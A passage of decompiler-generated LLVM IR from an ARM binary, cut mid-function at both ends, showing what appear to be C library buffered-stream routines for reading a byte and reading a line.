dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14ea4
  %v1_14eb0 = add i32 %v0_14eb0, 56
  store i32 %v1_14eb0, i32* @r4, align 4
  store i32 %v1_14eb0, i32* %r2.global-to-local, align 4
  store i32 %v2_14df4, i32* %r0.global-to-local, align 4
  %v0_14ec0 = load i32, i32* %sb.global-to-local, align 4
  %v1_14ec0 = load i32, i32* %fp.global-to-local, align 4
  %v2_14ec0 = add i32 %v1_14ec0, %v0_14ec0
  %v3_14ec0 = inttoptr i32 %v2_14ec0 to i32*
  %v4_14ec0 = load i32, i32* %v3_14ec0, align 4
  call void @__pseudo_branch(i32 %v4_14ec0)
  %v0_14ecc = load i32, i32* @r4, align 4
  store i32 %v0_14ecc, i32* %r0.global-to-local, align 4
  %v0_14ed0 = load i32, i32* %sb.global-to-local, align 4
  %v1_14ed0 = load i32, i32* @r8, align 4
  %v2_14ed0 = add i32 %v1_14ed0, %v0_14ed0
  %v3_14ed0 = inttoptr i32 %v2_14ed0 to i32*
  %v4_14ed0 = load i32, i32* %v3_14ed0, align 4
  call void @__pseudo_branch(i32 %v4_14ed0)
  %v0_14edc = load i32, i32* @r7, align 4
  %v1_14edc = inttoptr i32 %v0_14edc to i16*
  %v2_14edc = load i16, i16* %v1_14edc, align 2
  %v3_14edc = zext i16 %v2_14edc to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_14ee4 = or i32 %v3_14edc, %stack_var_-60.1.in
  %v1_14ee8 = xor i32 %v2_14ee4, 320
  store i32 %v1_14ee8, i32* %r3.global-to-local, align 4
  %v1_14eec = and i32 %v1_14ee8, 832
  %v2_14eec = icmp eq i32 %v1_14eec, 0
  br i1 %v2_14eec, label %dec_label_pc_14ef4, label %bb50

dec_label_pc_14ef4:                               ; preds = %dec_label_pc_14eb0
  store i32 %v0_14edc, i32* %r0.global-to-local, align 4
  %v1_14ef8 = call i32 @function_14a4c(i32 %v0_14edc)
  store i32 %v1_14ef8, i32* %r0.global-to-local, align 4
  %v2_14efc = icmp eq i32 %v1_14ef8, 0
  br i1 %v2_14efc, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_14ef4
  %v1_14f00 = load i32, i32* @r7, align 4
  %v2_14f00 = inttoptr i32 %v1_14f00 to i16*
  %v3_14f00 = load i16, i16* %v2_14f00, align 2
  %v4_14f00 = zext i16 %v3_14f00 to i32
  store i32 %v4_14f00, i32* %r3.global-to-local, align 4
  %v2_14f04 = add i32 %v1_14f00, 8
  %v3_14f04 = inttoptr i32 %v2_14f04 to i32*
  %v4_14f04 = load i32, i32* %v3_14f04, align 4
  store i32 %v4_14f04, i32* %r2.global-to-local, align 4
  %v2_14f08 = and i32 %v4_14f00, 65471
  store i32 %v2_14f08, i32* %r3.global-to-local, align 4
  %v3_14f0c = add i32 %v1_14f00, 28
  %v4_14f0c = inttoptr i32 %v3_14f0c to i32*
  store i32 %v4_14f04, i32* %v4_14f0c, align 4
  %v1_14f10 = load i32, i32* %r3.global-to-local, align 4
  %v2_14f10 = trunc i32 %v1_14f10 to i16
  %v3_14f10 = load i32, i32* @r7, align 4
  %v4_14f10 = inttoptr i32 %v3_14f10 to i16*
  store i16 %v2_14f10, i16* %v4_14f10, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_14ef4
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_14eb0, %.thread17
  store i32 %v2_14df4, i32* %r0.global-to-local, align 4
  %v0_14f20 = load i32, i32* %sb.global-to-local, align 4
  %v1_14f20 = load i32, i32* %sl.global-to-local, align 4
  %v2_14f20 = add i32 %v1_14f20, %v0_14f20
  %v3_14f20 = inttoptr i32 %v2_14f20 to i32*
  %v4_14f20 = load i32, i32* %v3_14f20, align 4
  call void @__pseudo_branch(i32 %v4_14f20)
  %v0_14f2c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14f2c

dec_label_pc_14f2c:                               ; preds = %dec_label_pc_14ea4, %bb50
  %v0_14f2c = phi i32 [ %v0_14eb0, %dec_label_pc_14ea4 ], [ %v0_14f2c.pre, %bb50 ]
  %v1_14f2c = add i32 %v0_14f2c, 32
  %v2_14f2c = inttoptr i32 %v1_14f2c to i32*
  %v3_14f2c = load i32, i32* %v2_14f2c, align 4
  store i32 %v3_14f2c, i32* @r7, align 4
  %v2_14f30 = icmp eq i32 %v3_14f2c, 0
  br i1 %v2_14f30, label %dec_label_pc_14f38, label %dec_label_pc_14ea4

dec_label_pc_14f38:                               ; preds = %dec_label_pc_14f2c, %dec_label_pc_14dd8
  %v0_14f38 = call i32 @function_14c14()
  store i32 %v0_14f38, i32* %r0.global-to-local, align 4
  %v0_14f74.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_14f40:                               ; preds = %dec_label_pc_14dc8
  %v1_14f40 = inttoptr i32 %v0_14f50 to i16*
  %v2_14f40 = load i16, i16* %v1_14f40, align 2
  %v3_14f40 = zext i16 %v2_14f40 to i32
  %v1_14f44 = and i32 %v3_14f40, 64
  store i32 %v1_14f44, i32* %r3.global-to-local, align 4
  %v2_14f44 = icmp eq i32 %v1_14f44, 0
  br i1 %v2_14f44, label %bb51, label %dec_label_pc_14f50

bb51:                                             ; preds = %dec_label_pc_14f40
  br label %bb52

dec_label_pc_14f50:                               ; preds = %dec_label_pc_14f40
  %v1_14f50 = call i32 @function_14a4c(i32 %v0_14f50)
  store i32 %v1_14f50, i32* %r0.global-to-local, align 4
  %v2_14f54 = icmp eq i32 %v1_14f50, 0
  br i1 %v2_14f54, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_14f50
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_14f50
  %v1_14f58 = load i32, i32* %fp.global-to-local, align 4
  %v2_14f58 = inttoptr i32 %v1_14f58 to i16*
  %v3_14f58 = load i16, i16* %v2_14f58, align 2
  %v4_14f58 = zext i16 %v3_14f58 to i32
  store i32 %v4_14f58, i32* %r3.global-to-local, align 4
  %v2_14f5c = add i32 %v1_14f58, 8
  %v3_14f5c = inttoptr i32 %v2_14f5c to i32*
  %v4_14f5c = load i32, i32* %v3_14f5c, align 4
  store i32 %v4_14f5c, i32* %r2.global-to-local, align 4
  %v2_14f60 = and i32 %v4_14f58, 65471
  store i32 %v2_14f60, i32* %r3.global-to-local, align 4
  %v2_14f64 = trunc i32 %v2_14f60 to i16
  store i16 %v2_14f64, i16* %v2_14f58, align 2
  %v1_14f68 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f68 = load i32, i32* %fp.global-to-local, align 4
  %v3_14f68 = add i32 %v2_14f68, 28
  %v4_14f68 = inttoptr i32 %v3_14f68 to i32*
  store i32 %v1_14f68, i32* %v4_14f68, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_14f38, %.thread24
  %v0_14f74 = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_14f74.pre, %dec_label_pc_14f38 ], [ 0, %.thread24 ]
  store i32 %v0_14f74, i32* %r0.global-to-local, align 4
  %v2_14f7c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14f7c, i32* %r4.global-to-local, align 4
  ret i32 %v0_14f74

; uselistorder directives
  uselistorder i32 %v0_14f74, { 1, 0 }
  uselistorder i32 %v3_14f2c, { 1, 2, 0 }
  uselistorder i32 %v0_14edc, { 1, 0, 2 }
  uselistorder i32 %v0_14e1c, { 1, 0, 2 }
  uselistorder i32 %v0_14f50, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 6, 5, 16, 7, 9, 8, 10, 12, 11, 13, 14, 15, 2, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @function_14c14, { 1, 0 }
  uselistorder i32 56, { 9, 10, 11, 2, 3, 12, 14, 5, 6, 7, 8, 1, 4, 13, 0, 15 }
  uselistorder i32* @r8, { 7, 8, 9, 10, 11, 12, 13, 14, 1, 15, 204, 158, 159, 2, 160, 161, 162, 186, 187, 188, 189, 190, 6, 191, 192, 193, 194, 195, 196, 197, 198, 63, 64, 65, 66, 67, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 16, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 3, 56, 57, 58, 59, 60, 61, 62, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 126, 4, 127, 128, 129, 130, 131, 132, 133, 134, 5, 135, 136, 137, 138, 139, 140, 0, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 199, 200, 201, 202, 203, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 121, 122, 123, 124, 125 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11 }
  uselistorder i32* inttoptr (i32 124160 to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32 72, { 0, 1, 2, 3, 4, 5, 15, 11, 12, 13, 14, 6, 16, 7, 8, 9, 10 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14f2c, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ea4, { 1, 0 }
  uselistorder label %dec_label_pc_14dd8, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_14f88(i32 %arg1) local_unnamed_addr {
dec_label_pc_14f88:
  %v0_14f88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14f88, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_14f88
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14f88, %bb
  %v5_14fa4 = phi i32 [ %arg1, %dec_label_pc_14f88 ], [ 0, %bb ]
  ret i32 %v5_14fa4

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_14fa8(i16* %arg1) local_unnamed_addr {
dec_label_pc_14fa8:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_14fa8 = load i32, i32* @r4, align 4
  store i32 %v3_14fa8, i32* %stack_var_-12, align 4
  %v6_14fa8 = load i32, i32* @r5, align 4
  %v9_14fa8 = load i32, i32* @lr, align 4
  %v0_14fac = load i32, i32* @r0, align 4
  %v1_14fac = add i32 %v0_14fac, 16
  %v2_14fac = inttoptr i32 %v1_14fac to i32*
  %v3_14fac = load i32, i32* %v2_14fac, align 4
  store i32 %v3_14fac, i32* %r2.global-to-local, align 4
  %v1_14fb0 = add i32 %v0_14fac, 24
  %v2_14fb0 = inttoptr i32 %v1_14fb0 to i32*
  %v3_14fb0 = load i32, i32* %v2_14fb0, align 4
  %v3_14fb4 = icmp ult i32 %v3_14fac, %v3_14fb0
  store i32 %v0_14fac, i32* @r4, align 4
  br i1 %v3_14fb4, label %bb, label %dec_label_pc_14fd4

bb:                                               ; preds = %dec_label_pc_14fa8
  %v2_14fc0 = inttoptr i32 %v3_14fac to i8*
  %v3_14fc0 = load i8, i8* %v2_14fc0, align 1
  %v4_14fc0 = zext i8 %v3_14fc0 to i32
  store i32 %v4_14fc0, i32* %r0.global-to-local, align 4
  %v6_14fc0 = add i32 %v3_14fac, 1
  store i32 %v6_14fc0, i32* %r2.global-to-local, align 4
  store i32 %v6_14fc0, i32* %v2_14fac, align 4
  br label %dec_label_pc_150c0

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14fa8
  store i32 124088, i32* @r5, align 4
  %v1_14fd4 = inttoptr i32 %v0_14fac to i16*
  %v2_14fd4 = load i16, i16* %v1_14fd4, align 2
  %v3_14fd4 = zext i16 %v2_14fd4 to i32
  %v1_14fd8 = and i32 %v3_14fd4, 131
  %tmp24 = icmp ugt i32 %v1_14fd8, 128
  br i1 %tmp24, label %dec_label_pc_14ff4, label %dec_label_pc_14fe4

dec_label_pc_14fe4:                               ; preds = %dec_label_pc_14fd4
  store i32 128, i32* @r1, align 4
  %v0_14fe8 = call i32 @function_15e1c()
  store i32 %v0_14fe8, i32* %r0.global-to-local, align 4
  %v2_14fec = icmp eq i32 %v0_14fe8, 0
  br i1 %v2_14fec, label %dec_label_pc_14fe4.dec_label_pc_14ff4_crit_edge, label %dec_label_pc_150bc

dec_label_pc_14fe4.dec_label_pc_14ff4_crit_edge:  ; preds = %dec_label_pc_14fe4
  %v0_14ff4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14ff4

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fe4.dec_label_pc_14ff4_crit_edge, %dec_label_pc_14fd4
  %v2_15034 = phi i32 [ %v0_14ff4.pre, %dec_label_pc_14fe4.dec_label_pc_14ff4_crit_edge ], [ %v0_14fac, %dec_label_pc_14fd4 ]
  %v1_14ff4 = inttoptr i32 %v2_15034 to i16*
  %v2_14ff4 = load i16, i16* %v1_14ff4, align 2
  %v3_14ff4 = zext i16 %v2_14ff4 to i32
  store i32 %v3_14ff4, i32* %r2.global-to-local, align 4
  %v1_14ff8 = and i32 %v3_14ff4, 2
  %v2_14ff8 = icmp eq i32 %v1_14ff8, 0
  br i1 %v2_14ff8, label %dec_label_pc_15024, label %dec_label_pc_15000

dec_label_pc_15000:                               ; preds = %dec_label_pc_14ff4
  %tmp25 = urem i16 %v2_14ff4, 2
  %v1_15000 = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_15000
  %v4_15004 = and i32 %tmp21, 4
  %v5_15004 = add i32 %v4_15004, %v2_15034
  %v1_15008 = add i32 %v5_15004, 36
  %v2_15008 = inttoptr i32 %v1_15008 to i8*
  %v3_15008 = load i8, i8* %v2_15008, align 1
  %v4_15008 = zext i8 %v3_15008 to i32
  %v1_1500c = add nsw i32 %v3_14ff4, -1
  store i32 %v1_1500c, i32* %r2.global-to-local, align 4
  store i32 %v4_15008, i32* %r0.global-to-local, align 4
  %v2_15018 = add i32 %v2_15034, 40
  %v3_15018 = inttoptr i32 %v2_15018 to i32*
  store i32 0, i32* %v3_15018, align 4
  %v0_1501c = load i32, i32* %r2.global-to-local, align 4
  %v1_1501c = trunc i32 %v0_1501c to i16
  %v2_1501c = load i32, i32* @r4, align 4
  %v3_1501c = inttoptr i32 %v2_1501c to i16*
  store i16 %v1_1501c, i16* %v3_1501c, align 2
  br label %dec_label_pc_150c0

dec_label_pc_15024:                               ; preds = %dec_label_pc_14ff4
  %v1_15024 = add i32 %v2_15034, 16
  %v1_15028 = inttoptr i32 %v1_15024 to i32*
  %v2_15028 = load i32, i32* %v1_15028, align 4
  %v3_15028 = add i32 %v2_15034, 20
  %v4_15028 = inttoptr i32 %v3_15028 to i32*
  %v5_15028 = load i32, i32* %v4_15028, align 4
  %v9_1502c = icmp eq i32 %v5_15028, %v2_15028
  br i1 %v9_1502c, label %dec_label_pc_1503c, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_15024
  %v2_15030 = inttoptr i32 %v2_15028 to i8*
  %v3_15030 = load i8, i8* %v2_15030, align 1
  %v4_15030 = zext i8 %v3_15030 to i32
  store i32 %v4_15030, i32* %r0.global-to-local, align 4
  %v6_15030 = add i32 %v2_15028, 1
  store i32 %v6_15030, i32* %v1_15028, align 4
  br label %dec_label_pc_150c0

dec_label_pc_1503c:                               ; preds = %dec_label_pc_15024
  %v1_1503c = add i32 %v2_15034, 4
  %v2_1503c = inttoptr i32 %v1_1503c to i32*
  %v3_1503c = load i32, i32* %v2_1503c, align 4
  %v7_15040 = icmp eq i32 %v3_1503c, -2
  br i1 %v7_15040, label %.thread8, label %dec_label_pc_15054

.thread8:                                         ; preds = %dec_label_pc_1503c
  %v2_15044 = or i16 %v2_14ff4, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_15044, i16* %v1_14ff4, align 2
  br label %dec_label_pc_150c0

dec_label_pc_15054:                               ; preds = %dec_label_pc_1503c
  %v1_15054 = and i32 %v3_14ff4, 768
  %v2_15054 = icmp eq i32 %v1_15054, 0
  br i1 %v2_15054, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_15054
  %v1_1505c = load i32, i32* @r5, align 4
  %v3_1505c = add i32 %v1_1505c, 44
  %v4_1505c = inttoptr i32 %v3_1505c to i32*
  %v5_1505c = load i32, i32* %v4_1505c, align 4
  store i32 %v5_1505c, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_15054, %bb22
  %v1_15060 = xor i1 %v2_15054, true
  call void @__pseudo_cond_branch(i1 %v1_15060, i32 ptrtoint (i32* @global_var_14d9c.457 to i32))
  %v0_15064 = load i32, i32* @r4, align 4
  %v1_15064 = add i32 %v0_15064, 8
  store i32 %v1_15064, i32* %r2.global-to-local, align 4
  %v1_15068 = inttoptr i32 %v1_15064 to i32*
  %v2_15068 = load i32, i32* %v1_15068, align 4
  store i32 %v2_15068, i32* %r2.global-to-local, align 4
  %v3_15068 = add i32 %v0_15064, 12
  %v4_15068 = inttoptr i32 %v3_15068 to i32*
  %v5_15068 = load i32, i32* %v4_15068, align 4
  %v9_1506c = icmp eq i32 %v5_15068, %v2_15068
  br i1 %v9_1506c, label %dec_label_pc_150a0, label %dec_label_pc_15074

dec_label_pc_15074:                               ; preds = %.thread10
  %v2_15074 = add i32 %v0_15064, 24
  %v3_15074 = inttoptr i32 %v2_15074 to i32*
  store i32 %v2_15068, i32* %v3_15074, align 4
  %v0_15078 = load i32, i32* @r4, align 4
  store i32 %v0_15078, i32* %r0.global-to-local, align 4
  %v2_1507c = call i32 @function_15dec(i32 %v0_15078)
  store i32 %v2_1507c, i32* %r0.global-to-local, align 4
  %v2_15080 = icmp eq i32 %v2_1507c, 0
  br i1 %v2_15080, label %dec_label_pc_150bc, label %dec_label_pc_15088

dec_label_pc_15088:                               ; preds = %dec_label_pc_15074
  %v0_15088 = load i32, i32* @r4, align 4
  %v1_15088 = add i32 %v0_15088, 20
  %v2_15088 = inttoptr i32 %v1_15088 to i32*
  %v3_15088 = load i32, i32* %v2_15088, align 4
  %v2_1508c = add i32 %v0_15088, 24
  %v3_1508c = inttoptr i32 %v2_1508c to i32*
  store i32 %v3_15088, i32* %v3_1508c, align 4
  %v0_15090 = load i32, i32* @r4, align 4
  %v1_15090 = add i32 %v0_15090, 16
  %v2_15090 = inttoptr i32 %v1_15090 to i32*
  %v3_15090 = load i32, i32* %v2_15090, align 4
  %v1_15094 = inttoptr i32 %v3_15090 to i8*
  %v2_15094 = load i8, i8* %v1_15094, align 1
  %v3_15094 = zext i8 %v2_15094 to i32
  store i32 %v3_15094, i32* %r0.global-to-local, align 4
  %v5_15094 = add i32 %v3_15090, 1
  store i32 %v5_15094, i32* %v2_15090, align 4
  br label %dec_label_pc_150c0

dec_label_pc_150a0:                               ; preds = %.thread10
  %v1_150a0 = inttoptr i32 %v0_15064 to i16*
  store i32 %v0_15064, i32* %r0.global-to-local, align 4
  %v2_150a4 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_150ac = call i32 @function_15ce0(i16* %v1_150a0, i32 %v2_150a4, i32 1)
  store i32 %v5_150ac, i32* %r0.global-to-local, align 4
  %v2_150b0 = icmp eq i32 %v5_150ac, 0
  br i1 %v2_150b0, label %dec_label_pc_150bc, label %bb23

bb23:                                             ; preds = %dec_label_pc_150a0
  %v4_150b4 = load i8, i8* %stack_var_-17, align 1
  %v5_150b4 = sext i8 %v4_150b4 to i32
  store i32 %v5_150b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_150c0

dec_label_pc_150bc:                               ; preds = %dec_label_pc_150a0, %dec_label_pc_14fe4, %dec_label_pc_15074
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_150c0

dec_label_pc_150c0:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_15088, %dec_label_pc_15000, %dec_label_pc_150bc
  %v2_150c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_150c4, i32* @r4, align 4
  store i32 %v6_14fa8, i32* @r5, align 4
  store i32 %v9_14fa8, i32* @lr, align 4
  %v1_150c8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_150c8

; uselistorder directives
  uselistorder i32 %v2_15028, { 1, 0, 2 }
  uselistorder i32 %v2_15034, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_14fac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14fac, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 1, 0, 4, 3, 2, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder i32 128, { 5, 0, 4, 6, 1, 7, 8, 9, 2, 10, 11, 12, 3 }
  uselistorder label %dec_label_pc_150c0, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_150bc, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_150d4(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_150d4:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_150d4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150d8 = icmp eq i32 %arg2, 0
  store i1 %v2_150d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_15160, label %dec_label_pc_15148.preheader

dec_label_pc_15148.preheader:                     ; preds = %dec_label_pc_150d4
  store i32 %tmp, i32* @r5, align 4
  %v1_151482 = add i32 %arg2, -1
  store i32 %v1_151482, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_151488 = icmp eq i32 %arg2, 1
  store i1 %v7_151488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_151488, label %dec_label_pc_15150, label %dec_label_pc_150f4

dec_label_pc_150f4:                               ; preds = %dec_label_pc_15148.preheader, %dec_label_pc_15148.backedge.dec_label_pc_150f4_crit_edge
  %v0_15118 = phi i32 [ %v0_150f4.pre, %dec_label_pc_15148.backedge.dec_label_pc_150f4_crit_edge ], [ %arg3, %dec_label_pc_15148.preheader ]
  %v1_150f4 = add i32 %v0_15118, 16
  %v2_150f4 = inttoptr i32 %v1_150f4 to i32*
  %v3_150f4 = load i32, i32* %v2_150f4, align 4
  store i32 %v3_150f4, i32* %r2.global-to-local, align 4
  %v1_150f8 = add i32 %v0_15118, 24
  %v2_150f8 = inttoptr i32 %v1_150f8 to i32*
  %v3_150f8 = load i32, i32* %v2_150f8, align 4
  store i32 %v3_150f8, i32* %r3.global-to-local, align 4
  %v3_150fc = icmp uge i32 %v3_150f4, %v3_150f8
  store i1 %v3_150fc, i1* %cpsr_c.global-to-local, align 1
  %v9_150fc = icmp eq i32 %v3_150f4, %v3_150f8
  store i1 %v9_150fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_150fc, label %dec_label_pc_15118, label %dec_label_pc_15104

dec_label_pc_15104:                               ; preds = %dec_label_pc_150f4
  %v1_15104 = inttoptr i32 %v3_150f4 to i8*
  %v2_15104 = load i8, i8* %v1_15104, align 1
  %v3_15104 = zext i8 %v2_15104 to i32
  store i32 %v3_15104, i32* %r3.global-to-local, align 4
  %v5_15104 = add i32 %v3_150f4, 1
  store i32 %v5_15104, i32* %r2.global-to-local, align 4
  %v2_15108 = load i32, i32* @r5, align 4
  %v3_15108 = inttoptr i32 %v2_15108 to i8*
  store i8 %v2_15104, i8* %v3_15108, align 1
  %v4_15108 = load i32, i32* @r5, align 4
  %v5_15108 = add i32 %v4_15108, 1
  store i32 %v5_15108, i32* @r5, align 4
  %v0_1510c = load i32, i32* %r3.global-to-local, align 4
  %v2_1510c = icmp ugt i32 %v0_1510c, 9
  store i1 %v2_1510c, i1* %cpsr_c.global-to-local, align 1
  %v7_1510c = icmp eq i32 %v0_1510c, 10
  store i1 %v7_1510c, i1* %cpsr_z.global-to-local, align 1
  %v0_15110 = load i32, i32* %r2.global-to-local, align 4
  %v1_15110 = load i32, i32* @r4, align 4
  %v2_15110 = add i32 %v1_15110, 16
  %v3_15110 = inttoptr i32 %v2_15110 to i32*
  store i32 %v0_15110, i32* %v3_15110, align 4
  br i1 %v7_1510c, label %dec_label_pc_15150, label %dec_label_pc_15148.backedge

dec_label_pc_15118:                               ; preds = %dec_label_pc_150f4
  %v1_15118 = inttoptr i32 %v0_15118 to i16*
  %v3_1511c = call i32 @function_14fa8(i16* %v1_15118)
  %v3_15120 = icmp eq i32 %v3_1511c, -1
  store i1 %v3_15120, i1* %cpsr_c.global-to-local, align 1
  %v8_15120 = icmp eq i32 %v3_1511c, -1
  store i1 %v8_15120, i1* %cpsr_z.global-to-local, align 1
  %v1_15124 = urem i32 %v3_1511c, 256
  store i32 %v1_15124, i32* %r3.global-to-local, align 4
  br i1 %v3_15120, label %dec_label_pc_1512c, label %dec_label_pc_15144

dec_label_pc_1512c:                               ; preds = %dec_label_pc_15118
  %v0_1512c = load i32, i32* @r4, align 4
  %v1_1512c = inttoptr i32 %v0_1512c to i16*
  %v2_1512c = load i16, i16* %v1_1512c, align 2
  %v3_1512c = zext i16 %v2_1512c to i32
  store i32 %v3_1512c, i32* %r3.global-to-local, align 4
  %v1_15130 = and i32 %v3_1512c, 8
  %v2_15130 = icmp eq i32 %v1_15130, 0
  store i1 %v2_15130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15130, label %dec_label_pc_15150, label %dec_label_pc_15160

dec_label_pc_15144:                               ; preds = %dec_label_pc_15118
  %v1_1513c = trunc i32 %v3_1511c to i8
  %v2_1513c = load i32, i32* @r5, align 4
  %v3_1513c = inttoptr i32 %v2_1513c to i8*
  store i8 %v1_1513c, i8* %v3_1513c, align 1
  %v4_1513c = load i32, i32* @r5, align 4
  %v5_1513c = add i32 %v4_1513c, 1
  store i32 %v5_1513c, i32* @r5, align 4
  %v0_15140 = load i32, i32* %r3.global-to-local, align 4
  %v2_15140 = icmp ugt i32 %v0_15140, 9
  store i1 %v2_15140, i1* %cpsr_c.global-to-local, align 1
  %v7_15140 = icmp eq i32 %v0_15140, 10
  store i1 %v7_15140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15140, label %dec_label_pc_15150, label %dec_label_pc_15148.backedge

dec_label_pc_15148.backedge:                      ; preds = %dec_label_pc_15144, %dec_label_pc_15104
  %v0_15148 = load i32, i32* %r6.global-to-local, align 4
  %v1_15148 = add i32 %v0_15148, -1
  store i32 %v1_15148, i32* %r6.global-to-local, align 4
  %v2_15148 = icmp ne i32 %v0_15148, 0
  store i1 %v2_15148, i1* %cpsr_c.global-to-local, align 1
  %v7_15148 = icmp eq i32 %v0_15148, 1
  store i1 %v7_15148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15148, label %dec_label_pc_15150, label %dec_label_pc_15148.backedge.dec_label_pc_150f4_crit_edge

dec_label_pc_15148.backedge.dec_label_pc_150f4_crit_edge: ; preds = %dec_label_pc_15148.backedge
  %v0_150f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_150f4

dec_label_pc_15150:                               ; preds = %dec_label_pc_15144, %dec_label_pc_15148.backedge, %dec_label_pc_15104, %dec_label_pc_15148.preheader, %dec_label_pc_1512c
  %v0_15150 = load i32, i32* @r5, align 4
  %v1_15150 = load i32, i32* @r7, align 4
  %v3_15150 = icmp uge i32 %v0_15150, %v1_15150
  store i1 %v3_15150, i1* %cpsr_c.global-to-local, align 1
  %v9_15150 = icmp eq i32 %v0_15150, %v1_15150
  store i1 %v9_15150, i1* %cpsr_z.global-to-local, align 1
  %v2_15154 = xor i1 %v9_15150, true
  %v3_15154 = and i1 %v3_15150, %v2_15154
  br i1 %v3_15154, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_15150
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_15158 = inttoptr i32 %v0_15150 to i8*
  store i8 0, i8* %v7_15158, align 1
  %v0_1515c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1515c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_15150, %bb
  %v1_1515c = phi i1 [ %v1_1515c.pre, %bb ], [ %v9_15150, %dec_label_pc_15150 ]
  %v0_1515c = phi i1 [ %v0_1515c.pre, %bb ], [ %v3_15150, %dec_label_pc_15150 ]
  %v2_1515c = xor i1 %v1_1515c, true
